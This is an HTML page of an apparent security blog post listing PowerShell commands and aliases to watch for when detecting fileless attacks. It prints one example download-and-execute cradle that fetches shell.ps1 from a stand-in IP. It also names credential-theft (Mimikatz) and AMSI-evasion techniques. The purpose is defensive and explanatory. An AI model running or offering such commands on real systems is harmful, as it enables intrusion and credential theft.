<!DOCTYPE html> 
<html lang="en-us"><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="msapplication-TileImage" content="/ms-icon-144x144.png"><meta name="msapplication-TileColor" content=" #abebc6">
  <meta name="theme-color" content=" #abebc6"><title>Detecting suspicious PowerShell usage | It&#39;s a Dev&#39;s world</title>
  <meta property="og:title" content="Detecting suspicious PowerShell usage - It&#39;s a Dev&#39;s world">
  <meta property="og:type" content="article">
  
  <meta property="article:published_time" content="2025-10-05T19:57:34&#43;08:00">
  
  
  <meta property="article:modified_time" content="2025-10-05T19:57:34&#43;08:00">
  
  <meta name="keywords" content="HTML, hugo, CSS, security, hacking, programming">
  <meta name="description" content="Detecting suspicious PowerShell usage"><meta name="author" content="">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="192x192" href="/android-icon-192x192.png">
  <link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
  <link rel="stylesheet" type="text/css" href="/programming/public/css/hulga.min.css">
  <link rel="stylesheet" type="text/css" href="/programming/public/css/hulga-dark.min.css" media="(prefers-color-scheme: dark)">
  <link rel="manifest" href="/manifest.json">
</head><body>
  <div id="main"><section class="hero is-primary shadow-hero  is-bold ">
  <div class="hero-head">
    <nav class="navbar is-primary">
  <div class="container">
    <div class="navbar-brand">
      <a class="navbar-item " href="https://jackleila.github.io/programming/public">
        It&#39;s a Dev&#39;s world
      </a>
      <a role="button" class="navbar-burger" data-target="navMenu" aria-label="menu" aria-expanded="false">
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
      </a>
    </div>
    <div class="navbar-menu" id="navMenu">
      <div class="navbar-end">
        
        <a class="navbar-item" href="/programming/public/" title="index">Index</a>
        
        <a class="navbar-item" href="/programming/public/about/" title="about">About</a>
        
      </div>
    </div>
  </div>
</nav>
  </div>
  <div class="hero-body">
    <header class="container has-text-centered">
      <h1 class="title post-title">
        Detecting suspicious PowerShell usage
      </h1>
      <h2 class="subtitle"><time class="post-meta">2025/10/05</time> ・
          
            <span class="post-tag post-meta">
              <a href="https://jackleila.github.io/programming/public/categories/soc">soc</a>
            </span>
          
        </h2>
      
      <div class="tagbox post-meta">
        
        <span class="post-tag">
          <a href="https://jackleila.github.io/programming/public/tags/powershell">#powershell</a>
        </span>
        
        <span class="post-tag">
          <a href="https://jackleila.github.io/programming/public/tags/fileless-malware">#fileless malware</a>
        </span>
        
      </div>
      
    </header>
  </div>
</section>
<section class="section">
  <div class="container">
    <div class="columns">
      
      <div class="column is-1 is-hidden-mobile"></div>
      <div class="column is-8">
      
        <article class="content" id="post-content"><h1 id="detecting-suspicious-powershell-usage">Detecting Suspicious PowerShell Usage</h1>
<p>In the recent years there was an increase in the fileless techniques that abuse Powershell and other applications (LOTLs) to download and execute malware. These attacks occur generally in memory, which makes detection more complicated than traditional malware.</p>
<p>Let&rsquo;s take a look at this example:</p>
<p><code>powershell.exe -command &quot;iex(New-Object Net.WebClient).DownloadString(‘http://10.10.13.1/shell.ps1’)&quot;</code></p>
<p>The script shell.ps1 is downloaded and directly executed in memory through <code>iex</code>. Many times, attackers will encode or offuscate the commands to avoid the detection. Here is a basic list of commands to take a look for when monitoring Powershell usage:</p>
<h2 id="common-malicious-commands">Common malicious commands</h2>
<h3 id="encoded-invocation">Encoded Invocation</h3>
<ul>
<li>Use of <code>-EncodedCommand</code></li>
<li>Base64 decoding via <code>[System.Convert]::FromBase64String(...)</code></li>
<li><code>Invoke-Expression</code> (IEX) with obfuscated strings</li>
</ul>
<h3 id="policy-bypass">Policy Bypass</h3>
<ul>
<li><code>-ExecutionPolicy Bypass</code> or <code>Unrestricted</code></li>
<li>Combined with <code>-NoProfile</code>, <code>-WindowStyle Hidden</code>, <code>-NonInteractive</code></li>
</ul>
<h3 id="download-and-execute">Download and Execute</h3>
<ul>
<li><code>Invoke-WebRequest</code>, <code>Invoke-RestMethod</code>, <code>System.Net.WebClient</code></li>
<li>Followed by IEX or file execution</li>
</ul>
<h3 id="in-memory-compilation">In-Memory Compilation</h3>
<ul>
<li><code>Add-Type -TypeDefinition</code></li>
<li><code>System.Reflection</code>, <code>Assembly::Load</code>, <code>Reflection.Assembly::Load</code></li>
</ul>
<h3 id="lateral-movement">Lateral Movement</h3>
<ul>
<li><code>Invoke-Command</code>, <code>Enter-PSSession</code>, <code>New-PSSession</code></li>
<li><code>Get-WmiObject</code>, <code>Get-CimInstance</code>, <code>Get-ADUser</code>, <code>Get-ADComputer</code></li>
</ul>
<h3 id="stealing-credentials">Stealing credentials</h3>
<ul>
<li><code>Invoke-Mimikatz</code> - I might make another post only about Mimikatz, very common tool for redteams and hackers.</li>
<li><code>Get-Credential</code></li>
</ul>
<h3 id="persistence">Persistence</h3>
<ul>
<li>Registry: <code>Set-ItemProperty</code> in <code>Run</code> keys</li>
<li><code>Register-ScheduledTask</code>, <code>schtasks</code></li>
</ul>
<h3 id="amsi-evasion">AMSI Evasion</h3>
<ul>
<li>Commands offuscated like: &ldquo;In&rdquo;+&ldquo;voke-Mi&rdquo;+&ldquo;mikatz&rdquo;</li>
<li>Commands to modify the memory of amsi.dll: <code>Invoke-NullAMSI</code>, <a href="https://github.com/BlackShell256/Null-AMSI">for example</a></li>
</ul>
<h2 id="common-aliases">Common aliases</h2>
<p>Some important Powershell aliases for detection are the following:</p>
<ul>
<li><code>iex</code> → <code>Invoke-Expression</code></li>
<li><code>iwr</code> → <code>Invoke-WebRequest</code></li>
<li><code>irm</code> → <code>Invoke-RestMethod</code></li>
<li><code>gp</code> / <code>Get-ItemProperty</code> sometimes used for registry checks</li>
<li><code>gcm</code> → <code>Get-Command</code> (used for discovery in scripts)</li>
<li><code>gci</code> / <code>ls</code> → <code>Get-ChildItem</code> (used for local enumeration)</li>
<li><code>%</code> → <code>ForEach-Object</code> and <code>?</code> → <code>Where-Object</code> (pipeline operators attackers use to process output)</li>
<li><code>gc</code> → <code>Get-Content</code> (read files, logs)</li>
<li><code>saps</code> → <code>Start-Process</code> (spawn processes)</li>
<li><code>ni</code> → <code>New-Item</code> (create files/keys)</li>
<li><code>sc</code> / <code>schtasks</code></li>
<li><code>-EncodedCommand</code> / <code>-enc</code></li>
<li><code>-Command</code> / <code>-c</code></li>
<li><code>-NoProfile</code> / <code>-nop</code></li>
</ul>
</article>
      </div>
      
      <div class="column is-hidden-mobile">
        <div class="sidebar" id="toc">
          
          <div class="post post-toc" id="post-toc">
            
          </div>
        </div>
      </div>
      
      </div>
    </div>
  </div>
</section>

  </div><footer class="footer">
  <div class="content has-text-centered">
    <p>Powered by <a href="https://gohugo.io">Hugo</a>. Theme <a href="https://www.github.com/wlh320/hugo-theme-hulga">Hulga</a></p>
    <p>Copyright © 2021 wlh. All rights reserved.
    </p>
  </div>
</footer>



<script src="https://jackleila.github.io/programming/public/js/pwa.min.js"></script>



<script src="https://cdn.jsdelivr.net/npm/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script><script>
addBackToTop({
  diameter: 42,

  backgroundColor: " #abebc6",

  innerHTML: '<svg viewBox="0 0 24 24"><path d="M4 12l1.41 1.41L11 7.83V20h2V7.83l5.58 5.59L20 12l-8-8-8 8z"/></svg>',
  textColor: '#fff'
});
</script>
<script type="text/javascript">
  
  document.addEventListener('DOMContentLoaded', () => {
    
    const $navbarBurgers = Array.prototype.slice.call(document.querySelectorAll('.navbar-burger'), 0);
    
    if ($navbarBurgers.length > 0) {
      
      $navbarBurgers.forEach(el => {
        el.addEventListener('click', () => {
          
          const target = el.dataset.target;
          const $target = document.getElementById(target);
          
          el.classList.toggle('is-active');
          $target.classList.toggle('is-active');
        });
      });
    }
  });
</script>
  <link id="hlcss" rel="stylesheet" type="text/css">

<script>
  function addCss(url) {
    var link = document.getElementById('hlcss');
    link.href = url;
  }
  
  var darkcss = "https://jackleila.github.io/programming/public/css/monokai.css"
  
  var lightcss = "https://jackleila.github.io/programming/public/css/monokailight.css"
  
  if (window.matchMedia('(prefers-color-scheme)').media === 'not all') {
    addCss(lightcss);
  } else if (window.matchMedia("(prefers-color-scheme: dark)").matches) {
    addCss(darkcss);
  } else {
    addCss(lightcss);
  }
  window.matchMedia("(prefers-color-scheme: dark)").addListener(
    e => e.matches && addCss(darkcss)
  );
  window.matchMedia("(prefers-color-scheme: light)").addListener(
    e => e.matches && addCss(lightcss)
  );
</script>
<script src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js"></script><script>
  anchors.options = {
    placement: 'left',
    
    icon: '#'
  };
  anchors.add('.content h1, .content h2, .content h3');
</script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha256-tn6hZ2YGDv0w1/DaFL4MiUoXuAVclrtFZs13ch3TB9M=" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha256-1qhJwAgsSPVSSjlQVTewHS49eaoAbOz651dveUANVBI=" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha256-oEuQVLwO5Ii6subChtLbrY5gx7NDRU+UJJ9jvvau+FI=" crossorigin="anonymous"></script><script>
  document.addEventListener("DOMContentLoaded", function () {
    renderMathInElement(document.body, {
      
      delimiters: [{
        left: "$$",
        right: "$$",
        display: true
      },
      {
        left: "\\[",
        right: "\\]",
        display: true
      },
      {
        left: "$",
        right: "$",
        display: false
      },
      {
        left: "\\(",
        right: "\\)",
        display: false
      }
      ]

    });
  });
</script>

  


<link rel="stylesheet" type="text/css" href="https://jackleila.github.io/programming/public/css/toc.min.css"><script src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js"></script>
<script>
    tocbot.init({
        
        tocSelector: '.post-toc',
        
        contentSelector: '#post-content',
        
        headingSelector: 'h1, h2, h3',
        collapseDepth:  0 ,
        scrollSmooth: true,
        positionFixedSelector: '.post-toc',
        
        
        fixedSidebarOffset: 273,
    });
</script>


</body>

</html>
